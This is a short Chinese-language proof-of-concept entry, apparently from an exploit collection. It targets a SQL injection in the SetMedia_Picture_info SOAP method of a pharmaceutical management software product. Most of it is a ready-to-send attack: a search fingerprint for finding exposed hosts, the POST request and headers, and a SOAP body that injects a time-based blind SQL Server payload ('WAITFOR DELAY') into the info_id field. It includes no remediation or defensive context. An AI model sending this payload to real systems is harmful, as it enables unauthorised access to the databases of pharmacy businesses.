# 黄药师药业管理软件SetMedia_Picture_info存在SQL注入漏洞

- **系统**：黄药师药业管理软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="XSDService.asmx"`
- **请求**：`POST /XSDService.asmx HTTP/1.1`
- **关键头**：`SOAPAction: "http://tempuri.org/SetMedia_Picture_info"`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: 488`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SetMedia_Picture_info xmlns="http://tempuri.org/">
<info_id>1';WAITFOR DELAY '0:0:6'--</info_id>
<info_file_name>string</info_file_name>
<info_data>base64Binary</info_data>
</SetMedia_Picture_info>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—